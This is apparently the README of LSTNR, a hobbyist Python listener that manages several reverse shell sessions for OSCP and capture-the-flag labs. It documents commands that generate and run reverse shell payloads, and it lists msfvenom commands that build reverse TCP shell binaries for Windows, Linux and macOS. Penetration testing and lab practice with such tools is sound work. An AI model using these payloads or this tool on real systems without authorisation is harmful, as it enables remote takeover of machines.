# LSTNR – Reverse Shell Session Manager

**LSTNR** is a command-line tool designed to manage multiple reverse shell sessions efficiently. It provides an interactive interface with logging, session handling, and real-time command execution.

<img width="543" alt="Screenshot 2025-04-15 at 9 06 02 PM" src="https://github.com/user-attachments/assets/6ede5d5a-c569-49ed-bca5-14d0590eb7d6" />

<img width="924" alt="Screenshot 2025-04-15 at 9 12 11 PM" src="https://github.com/user-attachments/assets/ab84a0d7-88b7-4ac9-afb3-fb60e50c389c" />

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP, HTB and THM labs. #Hobbies

# Download LSTNR

```
git clone github.com/bwithe/LSNTR

cd lstnr
```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`
- MENU COMMANDS
    - `help` or `?` : Displays info and usage on all commands
    - `ls` : lists connected clients
    - `cs <ID>` : connects to that session
    - `payload linux -lhost <IP> -lport <PORT` : Builds a rev.sh locally to copy to TGT
    - `payload windows -lhost <IP> -lport <PORT` : Builds a rev.ps1 locally to copy to TGT
    - `die` : Will terminate all sessions
    - `exit` : will terminate all sessions and stop the script
- SESSION COMMANDS
    - `hostname` : updates session table information
    - `whoami`: updates session table information
    - `stable` : upgrades TTY shell
    - `payload windows` : creates a rev.ps1 on tgt, and then executes it calling back to LSTNR
    - `payload linux` : creates a rev.sh on tgt, and then executes it calling back to LSTNR
    - `CTRL+C` or `bs` : backgrounds the active session
    - `die` : while in a session will terminate it

2. Have CLIENT connect to LSTNR
    - LSTNR has built in revshells, but depending on your situation, please see the following.
    - MSFVENOM
        - Best options that work with `lstnr.py`
            - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
            - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
            - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
            - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
    - https://www.revshells.com (recommended)
        - Windows: `Powershell #3 (Base64)`
        - Linux: `Bash -i`
        - MacOS: `python3`

# Screenshot examples:

- Starting the listener `python3 lstnr.py -p <port>`

<img width="550" alt="Screenshot 2025-03-19 at 5 34 42 PM" src="https://github.com/user-attachments/assets/4e232d54-4f4f-49a9-a65a-386f07dde910" />

- To get a list of commands, type `?` or `help`

![image](https://github.com/user-attachments/assets/16392e49-efd9-4aa2-9a8f-de52eaf87678)

- List any active sessions with `ls`

<img width="938" alt="Screenshot 2025-04-15 at 9 06 55 PM" src="https://github.com/user-attachments/assets/77e2f37d-f591-4e19-be66-2b73e438fb94" />


- To build reverse shells for Windows PowerShell
```
payload windows -lhost <IP> -lport <PORT>
```

- To build reverse shells for Linux /bin/sh
```
payload linux -lhost <IP> -lport <PORT>
```
![image](https://github.com/user-attachments/assets/655a628c-bcd5-4aac-b7c1-6d76cad63c52)

- Execute the reverse shells on TGT to get a session LSTNR
- When a session is established, `ls` will verify

<img width="927" alt="Screenshot 2025-04-15 at 9 18 20 PM" src="https://github.com/user-attachments/assets/7167dc57-cee1-4fb0-998e-c01dd6acd7cf" />

- Connecting to a session with `cs <id>` 
- To update the sessions table, run `whoami` and `hostname`
- When you background the session it will show the updated session table

<img width="597" alt="Screenshot 2025-03-19 at 5 35 33 PM" src="https://github.com/user-attachments/assets/6017b8e1-3532-4cfd-86bf-2800d119dc39" />

- Upgrade your shell with `stable`

![image](https://github.com/user-attachments/assets/f122bd70-6b46-4c22-8d6f-0044610a0245)

- Building a new session "revshell" with `payload linux`

![image](https://github.com/user-attachments/assets/13e5fb67-b891-4cd8-975a-6cca5bbe36f2)

- Building a new session "revshell" with `payload windows`

![image](https://github.com/user-attachments/assets/e5a8d0b7-b084-477e-a5df-4c32e88d7ee0)

- Background a session with `bs` or `CTRL+C`

![image](https://github.com/user-attachments/assets/0c0453f4-6c1d-4a17-a6d2-88ee862aaabc)

- To see updated session information, type `ls`

<img width="924" alt="Screenshot 2025-04-15 at 9 12 11 PM" src="https://github.com/user-attachments/assets/6128c810-7e7b-4950-9b3d-892725155917" />

- Kill an individual session `die`

<img width="382" alt="Screenshot 2025-03-19 at 7 50 05 PM" src="https://github.com/user-attachments/assets/7eac2b5f-9670-4f5b-9b93-99c89f98ade6" />

- To kill all sessions, type `die` at the main menu `lstnr$`

![image](https://github.com/user-attachments/assets/ebbc21c5-5481-4c90-8341-275a9bed6f6b)

- To kill `LSTNR$` and all connections, type `exit`

![image](https://github.com/user-attachments/assets/10ebe05b-c320-4465-ab83-a59b0a7f225e)

- LSTNR WILL NOT CLOSE WITH `CTRL+C`

<img width="508" alt="Screenshot 2025-03-19 at 7 50 29 PM" src="https://github.com/user-attachments/assets/74e8f8f9-989b-4284-8e02-cd83cf84c34d" />

- LSTNR also keeps a session and command log

![image](https://github.com/user-attachments/assets/79d08aae-287d-4f66-b9c4-ed97e7f213c7)


# TROUBLESHOOTING
- If a session hangs, background the session with `CTRL+C` and then reconnect.
- Sometimes the `whoami` and `hostname` commannd will hang, just background it and reconnect `cs <id>` and try running it again.
    - If commands stop working all together, reconnect to the session and run `die`, then re-run the reverse shell from the client machine.
- If you are having issues please feel free to reach out
